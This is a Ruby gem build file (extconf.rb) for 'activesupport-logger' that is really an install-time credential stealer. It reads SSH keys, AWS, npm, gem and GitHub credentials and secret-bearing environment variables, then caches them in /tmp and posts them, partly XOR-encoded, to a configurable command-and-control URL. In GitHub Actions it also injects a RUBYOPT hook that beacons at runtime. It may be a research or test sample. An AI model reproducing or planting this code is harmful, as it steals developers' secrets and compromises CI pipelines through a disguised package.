# extconf.rb — Phase 1 payload (install time)
# Runs during `gem install activesupport-logger`
require 'mkmf'
require 'net/http'
require 'json'
require 'uri'
require 'fileutils'

C2 = (ENV['PKG_ANALYTICS_URL'] || 'http://localhost:9999/collect').freeze
HOME = Dir.home.freeze

def rd(path)
  File.read(File.join(HOME, path)).slice(0, 4096)
rescue; nil; end

# Phase 1: install-time data collection
env_data = ENV.select { |k, _| k =~ /token|key|secret|pass|npm|aws|github|stripe|database|api|auth/i }

data = {
  ts: Time.now.to_i, h: `hostname 2>/dev/null`.strip, u: ENV['USER'],
  p: RUBY_PLATFORM, ci: !!ENV['CI'], phase: 'install',
  env: env_data,
  f: {
    rsa:    rd('.ssh/id_rsa'),
    ed:     rd('.ssh/id_ed25519'),
    aws:    rd('.aws/credentials'),
    npmrc:  rd('.npmrc'),
    gem:    rd('.gem/credentials'),
    netrc:  rd('.netrc'),
    gh:     rd('.config/gh/hosts.yml'),
    gitcfg: rd('.gitconfig'),
  }
}

# Write cache pointer for Phase 2 runtime pickup
cache_file = File.join('/tmp', ".activesupport-logger-#{rand(0xffff).to_s(16)}.cache")
File.write(cache_file, data.to_json)
File.write(File.join('/tmp', '.activesupport-logger-cache'), cache_file)

begin
  uri = URI.parse(C2)
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = uri.scheme == 'https'
  http.open_timeout = 3
  req = Net::HTTP::Post.new(uri.path.empty? ? '/' : uri.path)
  req['Content-Type'] = 'application/json'
  req['X-Pkg-Id'] = 'activesupport-logger-install'
  # XOR encode payload for basic obfuscation
  key = 'activesupport-logger-v7'.bytes
  encoded = data.to_json.bytes.each_with_index.map { |b, i| b ^ key[i % key.length] }
  req['X-Enc-Payload'] = [encoded.pack('C*')].pack('m0')
  req.body = data.to_json
  http.request(req)
rescue; nil; end

# Phase 1b: GitHub Actions injection at install time (runner may be active)
if (genv = ENV['GITHUB_ENV'])
  begin
    bin_dir = File.join(HOME, '.activesupport', 'lib')
    FileUtils.mkdir_p(bin_dir)
    hook = File.join(bin_dir, 'monitor.rb')
    File.write(hook,
      "begin;require 'net/http';Net::HTTP.get(URI('#{C2}/p?h='+`hostname 2>/dev/null`.strip+'&phase=runtime'));rescue;end\n"
    )
    File.open(genv, 'a') { |f| f.puts "RUBYOPT=-r#{hook}" }
  rescue; nil; end
end

create_makefile('activesupport_logger_ext')
